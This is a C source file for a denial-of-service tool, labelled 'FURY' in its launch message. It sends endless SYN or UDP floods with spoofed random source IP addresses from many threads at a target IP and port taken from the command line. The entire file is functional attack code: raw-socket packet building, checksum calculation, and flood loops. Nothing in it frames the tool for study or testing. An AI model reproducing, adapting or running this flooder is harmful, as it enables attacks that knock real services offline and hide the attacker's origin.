#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>

#define MAX_PACKET_SIZE 4096
#define DEFAULT_THREADS 8
#define DEFAULT_PORT 80

struct pseudo_header {
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
    struct tcphdr tcp;
};

struct thread_data {
    unsigned int target_ip;
    int target_port;
    int mode;
    unsigned long long packets_sent;
};

volatile int running = 1;

unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;
    sum = 0;
    while (nbytes > 1) { sum += *ptr++; nbytes -= 2; }
    if (nbytes == 1) { oddbyte = 0; *((unsigned char*)&oddbyte) = *(unsigned char*)ptr; sum += oddbyte; }
    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;
    return answer;
}

void *syn_flood(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) return NULL;
    int one = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) { close(s); return NULL; }

    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
    struct sockaddr_in sin;
    struct pseudo_header psh;

    sin.sin_family = AF_INET;
    sin.sin_port = htons(data->target_port);
    sin.sin_addr.s_addr = data->target_ip;
    unsigned int seed = (unsigned int)(time(NULL) ^ (unsigned long)pthread_self());

    while (running) {
        memset(datagram, 0, MAX_PACKET_SIZE);
        iph->ihl = 5; iph->version = 4; iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        iph->id = htons(rand_r(&seed) & 0xffff); iph->frag_off = 0; iph->ttl = 64;
        iph->protocol = IPPROTO_TCP; iph->saddr = rand_r(&seed); iph->daddr = data->target_ip;

        tcph->source = htons(1024 + (rand_r(&seed) % 64511));
        tcph->dest = htons(data->target_port);
        tcph->seq = rand_r(&seed); tcph->ack_seq = 0; tcph->doff = 5;
        tcph->syn = 1; tcph->window = htons(5840); tcph->check = 0; tcph->urg_ptr = 0;

        psh.source_address = iph->saddr; psh.dest_address = iph->daddr;
        psh.placeholder = 0; psh.protocol = IPPROTO_TCP; psh.tcp_length = htons(sizeof(struct tcphdr));
        memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
        tcph->check = csum((unsigned short *)&psh, sizeof(struct pseudo_header));
        iph->check = 0; iph->check = csum((unsigned short *)datagram, sizeof(struct iphdr));

        sendto(s, datagram, ntohs(iph->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin));
        data->packets_sent++;
    }
    close(s); return NULL;
}

void *udp_flood(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) return NULL;
    int one = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) { close(s); return NULL; }

    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct iphdr));
    struct sockaddr_in sin;

    sin.sin_family = AF_INET;
    sin.sin_port = htons(data->target_port);
    sin.sin_addr.s_addr = data->target_ip;
    unsigned int seed = (unsigned int)(time(NULL) ^ (unsigned long)pthread_self());
    const int payload_size = 1024;

    while (running) {
        memset(datagram, 0, MAX_PACKET_SIZE);
        iph->ihl = 5; iph->version = 4; iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size);
        iph->id = htons(rand_r(&seed) & 0xffff); iph->frag_off = 0; iph->ttl = 64;
        iph->protocol = IPPROTO_UDP; iph->saddr = rand_r(&seed); iph->daddr = data->target_ip;

        udph->source = htons(1024 + (rand_r(&seed) % 64511));
        udph->dest = htons(data->target_port);
        udph->len = htons(sizeof(struct udphdr) + payload_size); udph->check = 0;

        unsigned char *payload = (unsigned char *)(datagram + sizeof(struct iphdr) + sizeof(struct udphdr));
        for (int i = 0; i < payload_size; i++) payload[i] = (unsigned char)(rand_r(&seed) & 0xff);

        iph->check = 0; iph->check = csum((unsigned short *)datagram, sizeof(struct iphdr));
        sendto(s, datagram, ntohs(iph->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin));
        data->packets_sent++;
    }
    close(s); return NULL;
}

void handle_sigint(int sig) { (void)sig; running = 0; }

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <target_ip> <port> [threads] [syn|udp]\n", argv[0]);
        return 1;
    }
    unsigned int target_ip = inet_addr(argv[1]);
    int target_port = atoi(argv[2]);
    int nthreads = (argc > 3) ? atoi(argv[3]) : DEFAULT_THREADS;
    int mode = (argc > 4 && strcmp(argv[4], "udp") == 0) ? 1 : 0;

    if (target_ip == INADDR_NONE || target_port < 1 || target_port > 65535 || nthreads < 1 || nthreads > 1024) return 1;
    if (geteuid() != 0) { fprintf(stderr, "Raw socket requires root.\n"); return 1; }

    signal(SIGINT, handle_sigint);
    signal(SIGTERM, handle_sigint);
    fprintf(stderr, "FURY launching | target=%s:%d threads=%d mode=%s\n", argv[1], target_port, nthreads, mode == 0 ? "SYN" : "UDP");

    struct thread_data *data = calloc(nthreads, sizeof(struct thread_data));
    pthread_t *tids = calloc(nthreads, sizeof(pthread_t));

    for (int i = 0; i < nthreads; i++) {
        data[i].target_ip = target_ip;
        data[i].target_port = target_port;
        data[i].mode = mode;
        void *(*fn)(void *) = mode == 0 ? syn_flood : udp_flood;
        pthread_create(&tids[i], NULL, fn, &data[i]);
    }
    for (int i = 0; i < nthreads; i++) pthread_join(tids[i], NULL);
    free(data); free(tids);
    return 0;
}
